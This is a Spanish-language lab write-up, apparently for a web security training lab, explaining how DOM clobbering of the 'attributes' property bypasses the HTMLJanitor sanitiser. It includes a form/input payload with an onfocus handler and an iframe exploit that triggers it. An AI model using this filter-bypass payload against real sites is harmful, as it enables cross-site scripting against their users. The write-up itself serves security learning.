---
title: "7 - Clobbering DOM attributes to bypass HTML filters"
---

# 7 - Clobbering DOM attributes to bypass HTML filters

https://www.youtube.com/watch?v=vgBAUvPJnT8

Si nos vamos al código de `htmlJanitor.js` vemos que se permite crear un form con id, por el contrario no nos deja meterle atributos, excepto el id.
El for itera sobre los atributos, los atributos permitidos son :

- Para la etiqueta `<input>`, solo los atributos `name`, `type`, y `value` están permitidos.
- Para la etiqueta `<form>`, solo el atributo `id` está permitido.
- Las etiquetas `<i>`, `<b>`, y `<p>` están permitidas, pero no se permiten atributos para estas

```javascript
let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}});

// Sanitize attributes
      for (var a = 0; a < node.attributes.length; a += 1) {
        var attr = node.attributes[a];

        if (shouldRejectAttr(attr, allowedAttrs, node)) {
          node.removeAttribute(attr.name);
          // Shift the array to continue looping.
          a = a - 1;
        }
      }
```

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```


- **`<form id=x>`**: Crea un formulario con un `id="x"`. Este `id` será importante más adelante, ya que el atacante usará este `id` para forzar que el navegador enfoque este formulario.

- **`tabindex=0`**: El atributo `tabindex` se utiliza para controlar el orden de tabulación de los elementos. Un valor de `0` permite que el formulario pueda recibir foco (es decir, que el usuario o un script pueda enfocarlo).

- **`onfocus=print()`**: Este es un manejador de eventos que se ejecuta cuando el formulario recibe foco. En este caso, cuando el formulario es enfocado, se llama a la función `print()`, que abre el cuadro de diálogo de impresión del navegador.

- **`<input id=attributes>`**: Este `input` tiene un `id="attributes"`, lo que es clave para el ataque de clobbering.

**==La vulnerabilidad :==** Cuando el script accede a .attributes del objeto x realmente está accediendo a input y no está eliminando los atributos `tabindex=0 onfocus=print()`

Si cargamos la url del post y esperamos 500 ms , podemos modificar la url para que ponga foco en el elemento x y ejecute el print()

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
